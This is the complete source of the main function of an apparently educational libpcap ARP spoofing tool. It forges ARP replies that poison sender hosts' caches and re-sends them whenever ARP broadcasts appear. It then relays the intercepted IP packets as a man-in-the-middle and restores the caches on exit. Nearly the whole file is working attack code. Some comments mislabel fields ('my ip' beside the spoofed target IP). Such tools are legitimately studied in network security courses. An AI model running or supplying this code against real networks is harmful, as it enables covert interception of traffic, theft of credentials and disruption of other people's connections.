#include "arp_spoofing.h"

int main(int argc, char* argv[])
{
    if( argc < 4 || (argc % 2) ) {
        usage();
        return -1;
    }

    // open modules
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }


    // make address table
    const int session_size = (argc - 2) / 2;
    addr_pair* address_table = (addr_pair*)calloc(session_size, sizeof(addr_pair));

    for(int i = 0; i < session_size; i++)
    {
        uint8_t sender_mac[MAC_SIZE] = {0, }, target_mac[MAC_SIZE] = {0, };

        // get mac
        get_mac_from_ip(sender_mac, argv[2*(i+1)]);
        get_mac_from_ip(target_mac, argv[2*(i+1)+1]);

        // set address table
        memcpy(address_table[i].sdr_mac, sender_mac, MAC_SIZE);
        address_table[i].sdr_ip = inet_addr(argv[2*(i+1)]);
        memcpy(address_table[i].tgt_mac, target_mac, MAC_SIZE);
        address_table[i].tgt_ip = inet_addr(argv[2*(i+1)+1]);
    }

    Print((const uint8_t*)address_table, sizeof(addr_pair), session_size, "address table");   // testing


    // make all infection packets
    arp_packet* infected_arp_lists = (arp_packet*)calloc(session_size, sizeof(arp_packet));
    arp_packet* restored_arp_lists = (arp_packet*)calloc(session_size, sizeof(arp_packet));

    uint8_t my_mac[MAC_SIZE] = {0, };
    GetSvrMACAddress(my_mac);

    uint32_t my_ip = 0;
    GetSvrIPAddress(&my_ip);

    for(int i = 0; i < session_size; i++)
    {
        {
            // I -> sender (making infected packet)
            memcpy(infected_arp_lists[i].e.ether_dhost, address_table[i].sdr_mac, MAC_SIZE);
            memcpy(infected_arp_lists[i].e.ether_shost, my_mac, MAC_SIZE);
            infected_arp_lists[i].e.ether_type = htons(ETHERTYPE_ARP);

            infected_arp_lists[i].a.ar_hrd = htons(ARPHRD_ETHER);
            infected_arp_lists[i].a.ar_pro = htons(ETHERTYPE_IP);
            infected_arp_lists[i].a.ar_hln = MAC_SIZE;
            infected_arp_lists[i].a.ar_pln = IP_SIZE;
            infected_arp_lists[i].a.ar_op  = htons(ARPOP_REPLY);

            memcpy(infected_arp_lists[i].p.sdr_mac, my_mac, MAC_SIZE);                      // my mac
            infected_arp_lists[i].p.sdr_ip = inet_addr(argv[2*(i+1)+1]);                    // my ip
            memcpy(infected_arp_lists[i].p.tgt_mac, address_table[i].sdr_mac, MAC_SIZE);    // my mac
            infected_arp_lists[i].p.tgt_ip = inet_addr(argv[2*(i+1)]);                      // my ip
        }
        {
            // I -> sender (making restored packet)
            memcpy(restored_arp_lists[i].e.ether_dhost, address_table[i].sdr_mac, MAC_SIZE);
            memcpy(restored_arp_lists[i].e.ether_shost, my_mac, MAC_SIZE);
            restored_arp_lists[i].e.ether_type = htons(ETHERTYPE_ARP);

            restored_arp_lists[i].a.ar_hrd = htons(ARPHRD_ETHER);
            restored_arp_lists[i].a.ar_pro = htons(ETHERTYPE_IP);
            restored_arp_lists[i].a.ar_hln = MAC_SIZE;
            restored_arp_lists[i].a.ar_pln = IP_SIZE;
            restored_arp_lists[i].a.ar_op  = htons(ARPOP_REPLY);

            memcpy(restored_arp_lists[i].p.sdr_mac, address_table[i].tgt_mac, MAC_SIZE);    // my mac
            restored_arp_lists[i].p.sdr_ip = inet_addr(argv[2*(i+1)+1]);                    // my ip
            memcpy(restored_arp_lists[i].p.tgt_mac, address_table[i].sdr_mac, MAC_SIZE);    // my mac
            restored_arp_lists[i].p.tgt_ip = inet_addr(argv[2*(i+1)]);                      // my ip
        }
    }

    Print((const uint8_t*)infected_arp_lists, sizeof(arp_packet), session_size, "infection");   // testing
    Print((const uint8_t*)restored_arp_lists, sizeof(arp_packet), session_size, "restoration");   // testing

//    printf("press any key to continue..\n");
//    getchar();

//    pcap_close(handle);
//    free(infected_arp_lists);
//    free(restored_arp_lists);
//    free(address_table);
//    return 0;

    // Send all infected packets 3 times
    for(int count = 0; count < 3; count++)
    {
        for(int i = 0; i < session_size; i++)
        {
            if( pcap_sendpacket(handle, (const uint8_t*)&infected_arp_lists[i], sizeof(arp_packet)) ) {
                printf("infected arp packet sending failed\n");
                return -1;
            }
        }
    }


    // Relay all ip packets
    while(true)
    {
        struct pcap_pkthdr* header;
        const uint8_t* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        uint8_t target_mac[MAC_SIZE] = {0, };

        // if the packet is broadcasting packet from sender to target..
        if( is_broadcasting_packet(packet) ) {
            get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
            if( !strlen((char*)target_mac) ) continue;  // continue if the sender was not in our table

            int i = get_session_location(target_mac, address_table, session_size);
            for(int cnt = 0; cnt < 3; cnt++) {   // send packet three times
                sleep(1);   // make term before we send arp packet
                if( pcap_sendpacket(handle, (const uint8_t*)&infected_arp_lists[i], sizeof(arp_packet)) ) {
                    printf("broadcast arp packet sending failed\n");
                    return -1;
                }
            }
        }

        // if the packet is ip packet that we need to relay from sender to target..
        if( is_ip_packet(packet) ) {
            get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
            if( !strlen((char*)target_mac) ) continue;  // continue if that target mac was not in arp table

            set_relay_packet(packet, target_mac, my_mac);
            if( pcap_sendpacket(handle, packet, header->caplen)) {
                printf("relay packet sending failed\n");
                return -1;
            }
        }
    }


    // Send all restored packets 3 times
    for(int count = 0; count < 3; count++)
    {
        for(int i = 0; i < session_size; i++)
        {
            if( pcap_sendpacket(handle, (const uint8_t*)&restored_arp_lists[i], sizeof(arp_packet)) ) {
                printf("restored arp packet sending failed\n");
                return -1;
            }
        }
    }

    // Close and return
    pcap_close(handle);
    free(address_table);
    free(infected_arp_lists);
    free(restored_arp_lists);
    return 0;
}
